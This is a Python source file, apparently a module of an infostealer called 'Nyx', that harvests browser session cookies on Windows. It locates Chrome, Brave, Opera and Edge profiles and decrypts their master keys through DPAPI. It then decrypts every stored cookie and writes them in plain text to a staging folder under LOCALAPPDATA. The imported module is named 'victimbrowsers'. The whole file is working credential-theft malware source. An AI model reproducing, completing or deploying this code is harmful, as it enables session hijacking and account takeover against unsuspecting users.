import os
import shutil
import sqlite3
import base64
import json
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from .victimbrowsers import navegadores_instalados  


class CookieExtractor:
    def __init__(self, browser_name: str):
        self.browser_name = browser_name
        self.browser_path = self.get_browser_path()

    def get_browser_path(self) -> str:
        paths = {
            "chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
            "brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            "opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
            "edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
            "firefox": os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
        }
        return paths.get(self.browser_name.lower(), "")

    def get_encryption_key(self) -> bytes:
        try:
            if self.browser_name == "firefox":
                return None

            local_state_path = os.path.join(self.browser_path, "Local State")

            with open(local_state_path, 'r', encoding='utf-8') as file:
                local_state_data = json.load(file)

            encrypted_key = local_state_data["os_crypt"]["encrypted_key"]
            encrypted_key = base64.b64decode(encrypted_key)[5:]  # Remove o prefixo DPAPI
            decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

            return decrypted_key
        except Exception as e:
            print(f"Erro ao obter a chave de criptografia: {e}")
            return None

    def decrypt_cookie(self, encrypted_value: bytes, key: bytes) -> str:
        try:
            iv = encrypted_value[3:15]
            encrypted_value = encrypted_value[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_value = cipher.decrypt(encrypted_value)[:-16].decode()
            return decrypted_value
        except Exception as e:
            return ""

    def get_cookies_chromium(self) -> list[tuple[str, str, str]]:
        encryption_key = self.get_encryption_key()
        cookies = list()

        if encryption_key is None:
            print("Chave de criptografia não encontrada.")
            return cookies

        cookie_file_paths = list()

        for root, _, files in os.walk(self.browser_path):
            for file in files:
                if file.lower() == "cookies":
                    filepath = os.path.join(root, file)
                    cookie_file_paths.append(filepath)

        for path in cookie_file_paths:
            while True:
                tempfile = os.path.join(
                    os.getenv("TEMP"), self.get_random_string(10) + ".tmp"
                )
                if not os.path.isfile(tempfile):
                    break

            try:
                shutil.copy(path, tempfile)
            except Exception as e:
                print(f"Erro ao copiar arquivo de cookies: {e}")
                continue

            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()

            try:
                results = cursor.execute(
                    "SELECT host_key, name, encrypted_value FROM cookies"
                ).fetchall()

                for host_key, name, encrypted_value in results:
                    cookie_value = self.decrypt_cookie(encrypted_value, encryption_key)

                    if host_key and name and cookie_value:
                        cookies.append((host_key, name, cookie_value))

            except Exception as e:
                print(f"Erro ao consultar banco de dados: {e}")

            cursor.close()
            db.close()
            os.remove(tempfile)

        return cookies

    def get_cookies_firefox(self) -> list[tuple[str, str, str]]:
        # Implementar a lógica específica para Firefox, acessar o arquivo cookies.sqlite e processar os cookies.
        print("Extração para Firefox ainda não implementada.")
        return []

    def get_random_string(self, length: int) -> str:
        return base64.urlsafe_b64encode(os.urandom(length)).decode()[:length]

    def save_cookies_to_file(self, cookies: list[tuple[str, str, str]], file_path: str) -> None:
        try:
            with open(file_path, 'w', encoding='utf-8') as file:
                for host_key, name, cookie_value in cookies:
                    file.write(f"Host: {host_key}\nName: {name}\nCookie: {cookie_value}\n\n")
            print(f"Cookies salvos em: {file_path}")
        except Exception as e:
            print(f"Erro ao salvar cookies em arquivo: {e}")

    def get_cookies(self) -> list[tuple[str, str, str]]:
        if self.browser_name in ["chrome", "brave", "opera", "edge"]:
            return self.get_cookies_chromium()
        elif self.browser_name == "firefox":
            return self.get_cookies_firefox()
        else:
            print(f"Navegador {self.browser_name} não suportado.")
            return []


if __name__ == "__main__":
    navegadores_suportados = navegadores_instalados()
    
    # tem que alterar os nomes retornados para que o extractor encontre, 3 horas até descobrir essa merda
    navegador_map = {
        'Chrome': 'chrome',
        'Firefox': 'firefox',
        'Edge': 'edge',
        'Opera': 'opera',
        'Brave': 'brave'
    }

    navegadores_convertidos = [navegador_map[n] for n in navegadores_suportados if n in navegador_map]

    for browser in navegadores_convertidos:
        extractor = CookieExtractor(browser)
        cookies = extractor.get_cookies()

        if cookies:
            nyx_path = os.path.join(os.getenv("LOCALAPPDATA"), "Nyx")
            if not os.path.exists(nyx_path):
                os.makedirs(nyx_path)

            cookies_file_path = os.path.join(nyx_path, f"{browser}_cookies.txt")
            extractor.save_cookies_to_file(cookies, cookies_file_path)
        else:
            print(f"Nenhum cookie encontrado para {browser}.")
